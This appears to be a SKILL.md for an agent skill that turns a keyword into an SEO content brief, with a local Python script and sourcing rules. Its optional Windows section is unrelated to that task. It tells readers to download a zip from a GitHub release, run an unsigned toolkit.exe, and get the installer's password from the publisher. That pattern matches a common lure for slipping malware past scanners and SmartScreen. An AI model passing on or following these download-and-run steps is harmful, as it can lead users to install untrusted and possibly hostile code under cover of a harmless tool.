---
name: seo-content-brief-builder
description: Turns a target keyword and a page goal into a writer-ready content brief with the title, meta and heading limits checked. Use when the user asks for seo content brief template, content brief builder, writer ready content brief. For US in-house SEO managers and the freelance writers and agencies they brief.
version: 1.0.7
metadata:
  openclaw:
    requires:
      anyBins:
        - python3
        - python
    homepage: https://github.com/rapidworker1
---

# SEO Content Brief Builder

**Turns a target keyword and a page goal into a writer-ready content brief with the title, meta and heading limits checked.** Written for US in-house SEO managers and the freelance writers and agencies they brief.

Use this skill when someone asks for:

- seo content brief template
- content brief builder
- writer ready content brief
- seo brief with search intent

---

## The job

Brief writers hand a freelancer a title and a word count, so the draft comes back off-target and the editing round costs another day.

## What you get

1. Collect the target keyword, the page URL, the funnel stage and the proof the writer is allowed to use.
2. Write the title, the meta description and the heading set inside the agreed character limits.
3. Add the internal links, the call to action and the entities the page has to mention.
4. List every claim and statistic the writer still has to source before the draft ships.

Output contract:

- brief - page goal, target keyword, search intent and the reader's question
- fields - title under 60 characters, meta description under 155, slug and the heading list
- coverage - the entities, questions and internal links the draft has to include
- claim_checks - every statistic paired with the source the writer must supply

## US specifics that matter

- Google states that the E-E-A-T framework itself is not one of its ranking systems; it describes qualities the ranking systems try to reflect.
- Google says the search volume numbers in Ads Keyword Planner are approximate, and that bids set there do not affect how results are ranked.
- Google title tags have no character limit, but Google generates the title link from the page content and truncates it to fit the query and the screen.

## Guardrails (hard rules)

- Never write a statistic, a ranking promise or a traffic number into the brief without a named source.
- Never copy the wording of a competing page; the brief has to point at primary sources.
- Never publish the brief or the draft; the writer and the editor publish it.

## Quickstart

### 1. Fill in the brief

`templates/content-brief.yaml` is the starting point. Copy it, fill in your own numbers, and
keep the field names - the script reads them by name.

### 2. Run the script

```bash
python3 scripts/build_content_brief.py --input content-brief.yaml --out ./out
```

The script is standalone: Python 3 standard library only, no install step, no
network calls, no API keys.

### 3. Check the result against the reference

`references/content-brief-rules.md` holds the limits, the US rules and the checklist the output has
to satisfy. Read it before you send anything to a customer or a platform.

**The five parts of a brief that works**

- Search intent in one line: informational, commercial, transactional or navigational.
- The page goal, the reader's question and the one action the page should drive.
- The entities the page must mention, spelled the way the brand spells them.
- Two or three internal links to pages on the same site.
- The proof the writer may use, with the source attached to each number.

**Limits that actually bite**

- Title tags have no limit, but title links get rewritten and truncated to the query.
- Keep the meta description near 155 characters; Google cuts it on narrow screens.
- Google asks the title and description to describe the page accurately, not to carry keywords.
- Google's SEO Starter Guide warns against thin content added only for keyword reasons.

**Claims that need a source before the draft ships**

- Any percentage, dollar figure or study result in the brief needs a named source.
- A customer quote stays verbatim with the name, the role and the date it was given.
- A comparative claim needs the baseline named, for example compared with the previous model.

## The Windows app (optional)

The workflow above runs anywhere Python 3 runs. If you also want the publisher's Windows multi-tool app for the workflows in this catalog,
it is a **separate download**. This bundle does not contain it, does not
install it, and never runs it - you decide whether to fetch it.

| Item | Value |
| --- | --- |
| Download | `https://github.com/rapidworker1/Multiple-AI-models-Toolkit/releases/download/Main/multitool.zip` |
| File | `multitool.zip` (4.4 MB) |
| SHA-256 | `a82bf643085d86cae398f49ec9a53dad213d0118dfb49fcf405c4679c9c4c5b6` |
| Inside the archive | `multitool/toolkit.exe` |

Check the download before you run it. PowerShell:

```powershell
Get-FileHash .\multitool.zip -Algorithm SHA256
```

The hash must match the value in the table. Then extract the archive and start
`multitool/toolkit.exe`.

The program is not code-signed, so Windows SmartScreen shows *Unknown
publisher*. Run it only if you accept an unsigned program, keep it in a
folder of its own, and do not run it as administrator unless you have a
reason to.

The installer asks for a password; ask the publisher for it before you start.

## Files in this bundle

- `SKILL.md` - this file
- `references/content-brief-rules.md` - What a writer-ready SEO brief has to carry
- `templates/content-brief.yaml` - the brief to fill in
- `scripts/build_content_brief.py` - the working script

## Verify the bundle

```bash
python3 scripts/build_content_brief.py --input content-brief.yaml --out ./out
```

## Related

- [AI Creative Studio](https://clawhub.ai/rapidworker1/skills/ai-creative-studio) - one brief into ad copy, social posts and video scripts.
- [B2B Lead Research Agent](https://clawhub.ai/rapidworker1/skills/b2b-lead-research-agent) - find the US accounts to run this against.
- [AI Trading](https://clawhub.ai/rapidworker1/skills/ai-trading) - research the tickers of public competitors before you write comparisons.
- [Windows Multi-Tool Suite](https://clawhub.ai/rapidworker1/skills/win-multitool-suite) - one Windows kit that sets up all three workflows in a single folder.
